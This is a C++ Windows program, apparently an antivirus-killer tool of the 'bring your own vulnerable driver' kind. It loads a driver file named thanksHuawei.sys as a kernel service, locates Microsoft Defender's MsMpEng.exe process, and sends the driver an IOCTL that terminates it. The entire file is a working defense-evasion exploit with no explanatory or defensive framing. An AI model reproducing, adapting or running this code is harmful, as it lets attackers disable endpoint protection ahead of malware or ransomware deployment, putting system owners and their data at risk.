
#include <iostream>
#include <Windows.h>
#include <shlwapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "shlwapi.lib")

#define SERVICE_NAME L"HWAudioX64"
#define DEVICE_LINK_NAME L"\\\\.\\\\HWAudioX64"


DWORD get_process_id_by_name(const std::wstring& process_name)
{
	DWORD process_id = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(snapshot, &entry)) {
		do {
			if (_wcsicmp(entry.szExeFile, process_name.c_str()) == 0) {
				process_id = entry.th32ProcessID;
				break;
			}
		} while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);
	return process_id;
}



int wmain(int argc, wchar_t* argv[])
{

	wchar_t exe_path[MAX_PATH];
	GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
	PathRemoveFileSpecW(exe_path);

	std::wstring full_path = exe_path;
	full_path += L"\\";
	full_path += L"thanksHuawei.sys";

	SC_HANDLE manager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

	if (!manager) {
		std::wcout << L"[-] Unable to obtain service manager handle:" << GetLastError() << std::endl;
		return GetLastError();
	}

	SC_HANDLE service = CreateServiceW(manager, 
		SERVICE_NAME, SERVICE_NAME, MAXIMUM_ALLOWED,
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		full_path.c_str(), NULL, NULL, NULL, NULL, NULL);

	if (!service) {
		DWORD err = GetLastError();
		if (err == ERROR_SERVICE_EXISTS || err == ERROR_DUPLICATE_SERVICE_NAME) {
			// Service already exists, just open it
			service = OpenServiceW(manager, SERVICE_NAME, MAXIMUM_ALLOWED);
			if (!service) {
				std::wcout << L"[-] Unable to open existing service " SERVICE_NAME
					<< L": " << GetLastError() << std::endl;
				return GetLastError();
			}
		}
		else {
			std::wcout << L"[-] Unable to create service " SERVICE_NAME
				<< L": " << err << std::endl;
			return err;
		}
	}
	if (!StartServiceW(service, 0, NULL)) {
		DWORD err = GetLastError();
		if (err == ERROR_SERVICE_ALREADY_RUNNING) {
			std::wcout << L"[+] Service " SERVICE_NAME << L" is already running." << std::endl;
		}
		else {
			std::wcout << L"[-] Unable to start service " SERVICE_NAME
				<< L": " << err << std::endl;
			return err;
		}
	}
	else {
		std::wcout << L"[+] Service " SERVICE_NAME << L" started successfully." << std::endl;
	}

	HANDLE driver = CreateFileW(DEVICE_LINK_NAME, MAXIMUM_ALLOWED, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (!driver) {
		std::wcout << L"[-] Unable to open device link " DEVICE_LINK_NAME ":" << GetLastError() << std::endl;
		return GetLastError();
	}

	DWORD pid = get_process_id_by_name(L"MsMpEng.exe");

	if (!DeviceIoControl(driver, 0x2248dc, &pid, sizeof(DWORD), NULL, NULL, NULL, NULL)) {
		std::wcout << L"[-] Unable to send device io control code" DEVICE_LINK_NAME ":" << GetLastError() << std::endl;
		return GetLastError();
	}

	std::wcout << L"Terminating Process ID: " << pid  <<  std::endl;
	return ERROR_SUCCESS;
}
